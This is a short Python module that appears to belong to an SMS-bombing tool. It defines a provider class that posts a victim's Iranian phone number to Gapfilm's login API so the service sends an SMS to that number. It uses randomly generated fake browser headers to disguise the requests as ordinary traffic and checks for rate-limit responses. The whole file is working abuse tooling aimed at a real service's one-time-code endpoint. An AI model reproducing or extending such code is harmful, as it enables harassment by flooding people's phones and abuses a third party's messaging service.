# Github : https://github.com/Bllare
import random
import time
from apis.sms.base import SmsProvider
from apis.status import SendStatus
import requests
from fake_headers import Headers
import uuid

class SmsGapfilm(SmsProvider):
    name = "SMS Gapfilm"

    def send(self, phone: str) -> SendStatus:
        try:
            headers = Headers(browser="chrome",os="win",headers=True).generate()
            payload = {"Type": 3, "Username": "+98"+str(int(phone)), "SourceChannel": "GF_WebSite"}

            response = requests.post(f"https://core.gapfilm.ir/api/v3.1/Account/Login", headers=headers,json=payload)

            if response.status_code == 200:
                return SendStatus.SENT
            elif response.status_code == 429:
                return SendStatus.FAILED,
            else:
                return SendStatus.UNKNOWN
        except:
            return SendStatus.ERROR